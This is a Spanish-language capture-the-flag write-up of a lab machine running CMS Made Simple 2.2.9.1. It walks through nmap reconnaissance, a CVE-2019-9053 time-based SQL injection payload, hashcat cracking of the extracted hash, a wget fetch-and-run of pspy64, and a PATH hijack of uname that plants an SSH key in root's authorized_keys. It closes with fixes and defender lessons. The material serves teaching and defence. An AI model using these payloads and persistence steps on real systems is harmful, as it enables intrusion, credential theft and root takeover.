RECONOCIMIENTO

01 Escaneo completo de puertos — nmap -p-
¿Por qué? Antes de atacar, mapeamos toda la superficie expuesta. Un escaneo de todos los 65535 puertos garantiza que no perdamos servicios en puertos no estándar. Usamos SYN scan (-sS) para no completar el handshake TCP — más rápido y menos ruido en logs.
kali@kali — reconnaissance
$ nmap -p- --open -n -T4 -sS 10.129.19.66
▸output
PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63
¿Qué reveló? Solo 2 puertos abiertos: SSH (22) y HTTP (80). La superficie de ataque es reducida. El puerto 80 es el vector más probable — SSH requiere credenciales que aún no tenemos.
⚠ Trampa detectada: El scan -T4 agresivo puede triggear el fail2ban de la máquina, haciendo que el puerto 80 aparezca como "filtered" en la fase 2 de nmap. Solución: verificar con nc -zvw3 10.129.19.66 80 antes de asumir que está cerrado.
02 Enumeración de servicios — nmap -sC -sV
¿Por qué? Detectar las versiones exactas del software es crítico para buscar CVEs. El flag -sC ejecuta los scripts NSE por defecto de nmap, que entre otras cosas leen automáticamente robots.txt.
kali@kali — service detection
$ nmap -p22,80 -sC -sV -n 10.129.19.66
▸output
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 80/tcp open http Apache httpd 2.4.25 | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-title: Nothing here yet.
¿Qué reveló? nmap detectó automáticamente el robots.txt con una entrada prohibida: /writeup/. Este directorio es nuestro siguiente objetivo. No es necesario hacer fuzzing — el servidor ya nos reveló la ruta clave.
Decisión: Investigar /writeup/ directamente. El robots.txt es un mapa del tesoro que los administradores crean creyendo que oculta rutas de Google, pero es visible para cualquier atacante.
03 Fingerprint del CMS — curl + meta tags
kali@kali — web enumeration
$ curl -s http://10.129.19.66/writeup/doc/CHANGELOG.txt | head -2
▸output
Version 2.2.9.1 ------------------------------- Core - General
¿Qué reveló? CMS Made Simple versión 2.2.9.1. Esta versión exacta es vulnerable a CVE-2019-9053 (SQL Injection). El CHANGELOG.txt expone públicamente la versión del CMS — una misconfiguration común que facilita el reconocimiento pasivo.
02

EXPLOTACIÓN — CVE-2019-9053

CVE-2019-9053 CMS Made Simple < 2.2.10 — SQL Injection (Time-Based Blind)

El parámetro m1_idlist en el módulo News de CMS Made Simple no sanitiza el input antes de incluirlo en una consulta SQL. El atacante puede inyectar funciones de retardo (SLEEP()) para inferir datos de la base de datos caracter por caracter. No requiere autenticación.

04 Búsqueda de exploit — searchsploit
¿Por qué? searchsploit es la CLI de Exploit-DB, la mayor base pública de exploits. Buscar por nombre + versión del CMS nos da exploits públicos sin necesidad de internet.
kali@kali — exploit research
$ searchsploit "cms made simple 2.2"
▸output
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
Decisión: Copiar el exploit y adaptarlo a Python3 (el original usa termcolor en Python2 que no está disponible). El exploit usa SQLi time-based para extraer salt, username, email y hash de contraseña.
05 Ejecución del SQLi — extracción de credenciales
¿Cómo funciona el ataque? El exploit envía peticiones GET con payloads como: m1_idlist=a,b,1,5))+and+(select+sleep(1)+from+cms_siteprefs+where+sitepref_value+like+0x3561...25)+--+ Si el servidor tarda ≥1 segundo, el caracter es correcto. Se repite para cada posición hasta reconstruir el valor completo.
kali@kali — exploitation
$ python3 exploit.py -u http://10.129.19.66/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
▸output — ~8 minutos de SQLi time-based
[*] Salt: 5a599ef579066807 [+] Salt for password found: 5a599ef579066807 [*] Username: jkr [+] Username found: jkr [*] Email: jkr@writeup.htb [+] Email found: jkr@writeup.htb [*] Password hash: 62def4866937f08cc13bab43bb14e6f7 [+] Password hash: 62def4866937f08cc13bab43bb14e6f7
¿Qué obtuvimos? El hash es MD5 salteado en formato md5(salt + password). Tenemos todos los ingredientes para crackearlo con hashcat.
⚠ Nota: El --crack del exploit Python2/3 falla con UnicodeDecodeError en rockyou.txt. Usar hashcat directamente con modo 20.
06 Cracking del hash — hashcat mode 20
¿Por qué modo 20? hashcat -m 20 corresponde al formato md5($salt.$pass) — exactamente cómo CMS Made Simple almacena contraseñas: calcula MD5 de la concatenación de salt + password.
kali@kali — password cracking
$ echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > hash.txt $ hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt --force
▸output — 2 segundos (GPU)
Status: Cracked Hash.Mode: 20 (md5($salt.$pass)) 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9 Time.Started: 2 secs | Speed: 1967.0 kH/s
Credenciales obtenidas: jkr : raykayjay9. La contraseña estaba en rockyou.txt (rank ~4.3M). Crackeada en 2 segundos con GPU.

ESCALADA DE PRIVILEGIOS

08 Monitoreo de procesos — pspy64
¿Qué es pspy64? Herramienta que monitorea procesos Linux sin necesidad de root, usando inotify y lectura de /proc. Cuando el checklist básico (sudo -l, SUID, capabilities) no revela el vector, pspy descubre procesos periódicos o disparados por eventos.
jkr@writeup — process monitoring
# En Kali: servir pspy64 $ python3 -m http.server 8888 # En la víctima: jkr@writeup:/tmp$ wget http://[LHOST]:8888/pspy64 && chmod +x pspy64 && ./pspy64
▸output — al hacer SSH login desde otra terminal
CMD: UID=0 PID=1769 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d CMD: UID=0 PID=1770 | run-parts --lsbsysinit /etc/update-motd.d CMD: UID=0 PID=1771 | /bin/sh /etc/update-motd.d/10-uname
¿Qué reveló? Cada vez que alguien se conecta por SSH, sshd ejecuta como UID=0 (root):

PATH=/usr/local/sbin:... run-parts /etc/update-motd.d

El script 10-uname llama al comando uname sin ruta absoluta. El PATH busca primero en /usr/local/sbin. Si ese directorio es writable por jkr (a través del grupo staff), podemos inyectar un uname falso.
Decisión: Verificar si /usr/local/sbin es writable por staff, luego crear /usr/local/sbin/uname malicioso.
09 Verificación de permisos y PATH Hijacking
¿Qué es PATH Hijacking? Cuando un proceso privilegiado ejecuta un comando sin ruta absoluta (ej: uname en lugar de /bin/uname), el sistema busca en los directorios del PATH en orden. Si podemos colocar un binario malicioso en un directorio que aparece ANTES que el directorio legítimo, nuestro código se ejecuta con los privilegios del proceso padre.
jkr@writeup — privilege escalation
# Verificar que podemos escribir jkr@writeup:~$ ls -la /usr/local/ | grep sbin drwx-wsr-x 2 root staff 12288 Apr 19 2019 sbin # Crear binario malicioso uname que inyecta nuestra SSH key en root jkr@writeup:~$ cat > /usr/local/sbin/uname << 'EOF' #!/bin/bash mkdir -p /root/.ssh echo "ssh-rsa AAAA...kali@kali" >> /root/.ssh/authorized_keys chmod 600 /root/.ssh/authorized_keys EOF jkr@writeup:~$ chmod +x /usr/local/sbin/uname
¿Qué hicimos? Creamos /usr/local/sbin/uname — un script bash que añade nuestra clave SSH pública al archivo /root/.ssh/authorized_keys. Cuando la próxima conexión SSH dispare update-motd, este script se ejecutará como root.

ANÁLISIS DE VULNERABILIDADES

CVE-2019-9053 SQL Injection — CMS Made Simple

Causa raíz: El módulo News de CMSMS incluye el parámetro GET m1_idlist directamente en una consulta SQL sin sanitización ni prepared statements.


Fix correcto: Usar prepared statements y validar que el input solo contenga enteros separados por comas. Actualizar a CMS Made Simple ≥ 2.2.10.


Impacto en producción: Extracción de credenciales de admin → RCE → compromiso total del servidor web.

MISC PATH Hijacking — /usr/local/sbin writable por grupo staff

Causa raíz: El grupo staff en Debian tiene permisos de escritura en /usr/local/sbin por defecto. El script update-motd ejecutado por sshd como root usa comandos sin rutas absolutas, y el PATH incluye /usr/local/sbin primero.


Fix correcto: (1) Usar rutas absolutas en scripts ejecutados como root. (2) Remover permisos de escritura de staff en directorios del sistema: chmod 755 /usr/local/sbin

LECCIONES APRENDIDAS

// Para el atacante
  • robots.txt primero — Leer antes de lanzar gobuster. Ahorra 10 minutos de fuzzing.
  • Versión exacta importa — 2.2.9 vs 2.2.10: una versión de diferencia = SQLi crítica.
  • fail2ban ≠ inmune a SQLi — Protege el formulario de login, no los parámetros GET de módulos.
  • pspy64 cuando el checklist falla — Monitorear procesos al hacer SSH simultáneamente.
  • Grupo staff = señal de alarma — Verificar inmediatamente /usr/local/sbin permisos.
  • hashcat -m 20 para md5(salt+pass) — No confiar en el --crack del exploit (encoding issues).
// Para el defensor
  • Actualizar CMS Made Simple a versión ≥ 2.2.10 inmediatamente.
  • No exponer CHANGELOG.txt públicamente — revela la versión exacta.
  • Usar rutas absolutas en todos los scripts ejecutados como root.
  • Auditar permisos del grupo staff: chmod 755 /usr/local/sbin
  • Monitorear creación de archivos en /usr/local/sbin con auditd.
  • Regla IDS: múltiples requests con SLEEP() en parámetros GET → SQLi.

GLOSARIO

SQL Injection
Vulnerabilidad donde input sin sanitizar se incluye en consultas SQL, permitiendo al atacante modificar la lógica de la base de datos.
Time-Based Blind SQLi
Variante de SQLi donde se infieren datos usando funciones de retardo (SLEEP). Si el servidor tarda = condición verdadera.
MD5 Salteado
Hash MD5 calculado sobre salt+password. El salt único hace que el mismo password produzca hashes distintos, dificultando ataques de diccionario simples.
robots.txt
Archivo que indica a bots qué no indexar. A menudo expone rutas "privadas" al atacante — el administrador lo crea creyendo que oculta contenido.
PATH Hijacking
Colocar un binario malicioso en un directorio que aparece antes en $PATH que el directorio legítimo. El proceso privilegiado ejecuta el malicioso primero.
update-motd
Sistema que genera el "Mensaje del Día" en SSH. Se ejecuta como root en cada conexión SSH, ejecutando scripts en /etc/update-motd.d/.
pspy64
Herramienta para monitorear procesos Linux sin privilegios root. Usa inotify + /proc para capturar procesos nuevos en tiempo real.
fail2ban
Software que bloquea IPs tras múltiples intentos fallidos. Protege formularios de login pero raramente los parámetros GET de aplicaciones.
hashcat -m 20
Modo de hashcat para crackear hashes en formato md5($salt.$pass). Usa GPU para probar millones de contraseñas por segundo.
